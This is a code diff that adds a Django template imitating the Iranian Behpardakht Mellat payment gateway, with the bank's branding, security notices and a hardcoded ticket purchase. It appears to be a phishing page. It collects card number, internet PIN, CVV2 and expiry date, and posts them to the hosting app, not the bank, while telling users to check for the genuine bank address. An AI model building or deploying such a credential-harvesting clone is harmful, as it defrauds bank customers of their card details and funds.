@@ -1,0 +1,361 @@
+
+
+{% load static %}
+
+
+
+
+<html>
+<head>
+     <meta http-equiv="X-Frame-Options" content="deny">
+    <script>if (top != self) top.location = location</script>
+    
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title>دروازه پرداخت اينترنتي به پرداخت ملت</title>
+    <link href="{% static "css/Styleyui.css" %}" rel="stylesheet" type="text/css">
+    <script type="text/javascript" src="{% static "js/jqueryyui.js"%}"></script>
+    <script type="text/javascript" src="{% static "js/jquery.formyui.js" %}"></script>
+    <script type="text/javascript" src="{% static "js/formyui.js" %}"></script>
+
+    <script type="text/javascript" src="{% static "js/allYui.js" %}"></script>
+    <script language="JavaScript">
+        if (top.frames.length != 0) {
+            top.location = window.location;
+        }
+    </script>
+</head>
+<body dir="rtl" onkeypress="keyHandler()" onload="c_random();display();" oncontextmenu="return false;">
+<table width="100%">
+<tr>
+<td align="center">
+
+<form method="post" id="PayForm" name="PayForm" autocomplete="off">
+
+<table class="MainTable">
+<tr align="center">
+<td>
+
+<table class="PgwTable">
+    <tr align="center">
+        <td colspan="2">
+            <img class="Banner" src="images/logo.jpg" width="130" height="652">
+        </td>
+    </tr>
+    <tr>
+        <td align="right">
+            <table>
+                <tr>
+                    <td class="InputTitleTD">
+                        نام پذيرنده
+                    </td>
+                    <td class="InputValue">
+                        &nbsp; ته بلیت&nbsp;
+                    </td>
+                </tr>
+                <tr>
+                    <td class="InputTitleTD">
+                        مبلغ قابل پرداخت
+                    </td>
+                    <td class="InputValue">
+                        &nbsp; 1,440,000 &nbsp; ريال
+                    </td>
+                </tr>
+
+                
+            </table>
+        </td>
+        <td align="center" width="30%">
+            <TABLE class="TableBorder">
+                <TR>
+                    <td>
+                        <font class="SpecialText">
+                            زمان باقيمانده
+                        </font>
+                        <input class="TimeInput" name="time" id="time" readonly="true" tabindex="-1">
+                    </td>
+                </tr>
+            </table>
+        </td>
+    </tr>
+    <tr>
+        <td colspan="2" height="1" bgcolor="#F76A25">
+        </td>
+    </tr>
+</table>
+<div id="part1">
+<table class="PgwTable">
+<tr>
+    <td colspan="2" align="center">
+        <b class="HeaderFont">
+            اطلاعات کارت
+        </b>
+    </td>
+</tr>
+<tr>
+    <td colspan="2" align="center" class="AlertTD">
+        <img id="AjaxLoad" src="images/unload.gif" alt="" title="" width="1" height="1">&nbsp;&nbsp;<span
+            id="alert"></span>&nbsp;&nbsp;
+    </td>
+</tr>
+<tr>
+    <td align="right" valign="top">
+        <table>
+            <tr   >
+                <td class="InputTitleTD">
+                    شماره کارت
+                    <font class="Star">
+                        *
+                    </font>
+                </td>
+                <td dir="ltr" align="right">
+                    <input size="4" type="text" class="PanInput" id="W_PAN4" name="W_PAN4" maxlength="4"
+                           autocomplete="off"
+                           onkeypress="return numericOnKeypress(event)" onkeyup="nextTabs(this, false, event)"
+                           value=""   
+                           tabindex="1" width="200"
+                           dir="ltr" onpaste="doNotPaste()" onfocus="getName(this)">
+                    <input size="4" type="text" class="PanInput" id="W_PAN3" name="W_PAN3" maxlength="4"
+                           autocomplete="off"
+                           onkeypress="return numericOnKeypress(event)" onkeyup="nextTabs(this, false, event)"
+                           value=""  
+                           tabindex="2" width="150"
+                           dir="ltr" onpaste="doNotPaste()" onfocus="getName(this)">
+                    <input size="4" type="text" class="PanInput" id="W_PAN2" name="W_PAN2" maxlength="4"
+                           autocomplete="off"
+                           onkeypress="return numericOnKeypress(event)" onkeyup="nextTabs(this, false, event)"
+                           value="" 
+                           tabindex="3" width="100"
+                           dir="ltr" onpaste="doNotPaste()" onfocus="getName(this)">
+                    <input size="4" type="text" class="PanInput" id="W_PAN1" name="W_PAN1" maxlength="4"
+                           autocomplete="off"
+                           onkeypress="return numericOnKeypress(event)" onkeyup="nextTabs(this, false, event)"
+                           value="" 
+                           tabindex="4" width="50"
+                           dir="ltr" onpaste="doNotPaste()" onfocus="getName(this)">
+                </td>
+            </tr>
+
+            <tr>
+                <td class="InputTitleTD">
+                    رمز اينترنتي کارت
+                    <font class="Star">
+                        *
+                    </font>
+                </td>
+                <td dir="ltr" align="right">
+                    <input type="password" size="12" class="PublicInput" id="W_PIN" name="W_PIN" maxlength="12"
+                           onkeypress="return numericOnKeypress(event)" onkeyup="nextTabs(this, false, event)"
+                           tabindex="5"
+                           dir="ltr" onpaste="doNotPaste()" onfocus="getName(this)"/>
+                </td>
+            </tr>
+            <tr>
+                <td class="InputTitleTD">
+                    شماره شناسایی دوم (CVV2)
+                    <font class="Star">
+                        *
+                    </font>
+                </td>
+                <td dir="ltr" align="right">
+                    <input type="password" size="4" class="PublicInput" id="W_CVV2" name="W_CVV2" maxlength="4"
+                           onkeypress="return numericOnKeypress(event)" onkeyup="nextTabs(this, false, event)"
+                           tabindex="6"
+                           dir="ltr" onpaste="doNotPaste()" onfocus="getName(this)"/>
+                </td>
+            </tr>
+            <tr>
+                <td class="InputTitleTD">
+                    تاريخ انقضاي کارت
+                    <font class="Star">
+                        *
+                    </font>
+                </td>
+                <td dir="ltr" align="right">
+                    <font class="SpecialHint">
+                        (ماه / سال)
+                    </font>
+                    &nbsp;
+                    <input size="2" type="text" class="DateInput" id="W_EXPIRE2" name="W_EXPIRE2" maxlength="2"
+                           onkeypress="return numericOnKeypress(event)" onkeyup="nextTabs(this, false, event)"
+                           autocomplete="off"
+                           tabindex="8"
+                           dir="ltr"
+                           onpaste="doNotPaste()" onfocus="getName(this)">
+                    <font class="SpecialHint">
+                        <b>/</b>
+                    </font>
+                    <input size="2" type="text" class="DateInput" id="W_EXPIRE1" name="W_EXPIRE1" maxlength="2"
+                           onkeypress="return numericOnKeypress(event)" onkeyup="nextTabs(this, false, event)"
+                           autocomplete="off"
+                           tabindex="7"
+                           dir="ltr"
+                           onpaste="doNotPaste()" onfocus="getName(this)">
+                </td>
+            </tr>
+            
+
+            
+            
+            <input type="hidden" size="17" id="W_PAYERID" name="W_PAYERID"
+                   value="1163282"/>
+            
+            
+        </table>
+    </td>
+    <td align="center" width="30%">
+        <TABLE class="TableBorder">
+            <TR>
+                <TD class="BorderTD"><input name="btn7" id="btn7" type="KB_Button" readonly="true" tabindex="-1"
+                                            onclick="fill(this)" class="NumPressed"></TD>
+                <TD class="BorderTD"><input name="btn8" id="btn8" type="KB_Button" readonly="true" tabindex="-1"
+                                            onclick="fill(this)" class="NumPressed"></TD>
+                <TD class="BorderTD"><input name="btn9" id="btn9" type="KB_Button" readonly="true" tabindex="-1"
+                                            onclick="fill(this)" class="NumPressed"></TD>
+            </TR>
+            <TR>
+                <TD class="BorderTD"><input name="btn4" id="btn4" type="KB_Button" readonly="true" tabindex="-1"
+                                            onclick="fill(this)" class="NumPressed"></TD>
+                <TD class="BorderTD"><input name="btn5" id="btn5" type="KB_Button" readonly="true" tabindex="-1"
+                                            onclick="fill(this)" class="NumPressed"></TD>
+                <TD class="BorderTD"><input name="btn6" id="btn6" type="KB_Button" readonly="true" tabindex="-1"
+                                            onclick="fill(this)" class="NumPressed"></TD>
+            </TR>
+            <TR>
+                <TD class="BorderTD"><input name="btn1" id="btn1" type="KB_Button" readonly="true" tabindex="-1"
+                                            onclick="fill(this)" class="NumPressed"></TD>
+                <TD class="BorderTD"><input name="btn2" id="btn2" type="KB_Button" readonly="true" tabindex="-1"
+                                            onclick="fill(this)" class="NumPressed"></TD>
+                <TD class="BorderTD"><input name="btn3" id="btn3" type="KB_Button" readonly="true" tabindex="-1"
+                                            onclick="fill(this)" class="NumPressed"></TD>
+            </TR>
+            <TR>
+                <TD class="BorderTD"><input name="btn0" id="btn0" type="KB_Button" readonly="true" tabindex="-1"
+                                            onclick="fill(this)" class="NumPressed"></TD>
+                <TD class="BorderTD"><input name="Back" value="Back" type="KB_Button" readonly="true"
+                                            tabindex="-1"
+                                            onclick="backspace()" class="NumPressed">
+                </TD>
+                <TD class="BorderTD"><input name="Back" value="Tab" type="KB_Button" readonly="true"
+                                            tabindex="-1"
+                                            onclick="tab()" class="NumPressed"></TD>
+            </TR>
+            <TR>
+                <TD colspan="3" align="center">
+                    <font class="SpecialText">
+                        صفحه کليد ايمن
+                    </font>
+                </TD>
+            </TR>
+        </TABLE>
+        <br>
+    </td>
+</tr>
+<tr>
+    <td colspan="2" height="0.1" bgcolor="#F76A25">
+    </td>
+</tr>
+<tr>
+
+    <td colspan="2" class="FooterTD">
+                <a class="Public_Button" href="/code">
+            پرداخت
+        </a>
+        &nbsp;&nbsp;&nbsp;
+        <input type="submit" class="Public_Button" id="doCancel" name="doCancel" value="انصراف">
+    </td>
+</tr>
+</table>
+</div>
+
+</td>
+</tr>
+</table>
+</form>
+
+<form method="post" name="returnForm" action="http://ticket2.raja.ir/PGCallBack.aspx">
+    <input type="hidden" id="RefId" name="RefId" value="64B19193B4793256">
+    <input type="hidden" id="ResCode" name="ResCode">
+    <input type="hidden" id="SaleOrderId" name="SaleOrderId" value="26701310">
+    <input type="hidden" id="SaleReferenceId" name="SaleReferenceId">
+    <input type="hidden" id="CardHolderInfo" name="CardHolderInfo">
+    <input type="hidden" id="CardHolderPan" name="CardHolderPan">
+</form>
+
+<form method="post" name="lotteryForm" action="lottery.mellat">
+    <input type="hidden" id="lResCode" name="lResCode">
+    <input type="hidden" id="lSaleOrderId" name="lSaleOrderId" value="26701310">
+    <input type="hidden" id="lSaleReferenceId" name="lSaleReferenceId">
+    <input type="hidden" id="lCardHolderInfo" name="lCardHolderInfo">
+    <input type="hidden" id="lcallBackUrl" name="lcallBackUrl" value="http://ticket2.raja.ir/PGCallBack.aspx">
+    <input type="hidden" id="giftAmount" name="giftAmount">
+    <input type="hidden" id="pan" name="pan">
+    <input type="hidden" id="IRefId" name="IRefId">
+
+</form>
+
+
+<TABLE class=MainTable>
+    <TBODY>
+    <TR align=middle>
+        <TD>
+            <TABLE class=PgwTable>
+                <TBODY>
+
+                <TR>
+                    <TD class=FooterTD colSpan=2 align=middle>
+                        <B class=HeaderFont><font color="#FFEFEF"> ملاحظات امنيتي</Font></B>
+                    </TD>
+                </TR>
+                <tr>
+                    <td height="0.1" bgcolor="#F76A25">
+                    </td>
+                </tr>
+                <tr>
+                    <td height="10">
+                    </td>
+                </tr>
+                <TR>
+                    <TD>
+                        <UL>
+                            <LI><p class="SecurityTitle" align=justify>
+                                دروازه پرداخت اینترنتی به پرداخت ملت با استفاده از پروتکل امن SSL به مشتریان خود ارایه
+                                خدمت
+                                نموده و با آدرس <span class=FooterRedSpan>https://bpm.shaparak.ir</span> شروع می
+                                شود. خواهشمند است به منظور جلوگیری از سوء استفاده های احتمالی پیش از ورود هرگونه
+                                اطلاعات، آدرس موجود در بخش مرورگر وب خود را با آدرس فوق مقایسه نمایید و درصورت مشاهده هر
+                                نوع مغایرت احتمالی، موضوع را با ما درمیان بگذارید. </P></LI>
+                            <LI><p class="SecurityTitle" align=justify>
+                                لطفا از صحت نام فروشنده و مبلغ نمایش داده شده، اطمینان حاصل فرمایید.
+                            </P></LI>
+                            <LI><p class="SecurityTitle" align=justify>
+                                برای جلوگیری از افشای رمز کارت خود، حتی المقدور از صفحه کلید مجازی استفاده فرمایید.
+                            </P></LI>
+                            <LI><p class="SecurityTitle" align=justify>
+                                برای کسب اطلاعات بیشتر، گزارش فروشگاههای مشکوک و همچنین اطلاع از وضعیت پذیرندگان
+                                اینترنتی با ما تماس بگیرید.
+                            </P></LI>
+                        </UL>
+                    </TD>
+                </TR>
+                </TBODY>
+            </TABLE>
+
+        </TD>
+    </TR>
+</TABLE>
+
+<TABLE class=FooterTable>
+    <TBODY>
+    <TR>
+        <TD class=FooterHint><B>شرکت به پرداخت ملت ارايه دهنده خدمات نوین پرداخت الکترونيک
+            <div class=FooterRedSpan>http://www.behpardakht.com</div>
+            شماره تماس : 27312733-021
+        </TD>
+    </TR>
+    </TBODY>
+</TABLE>
+</TD>
+</TR>
+</TBODY></TABLE>
+</BODY>
+</HTML>
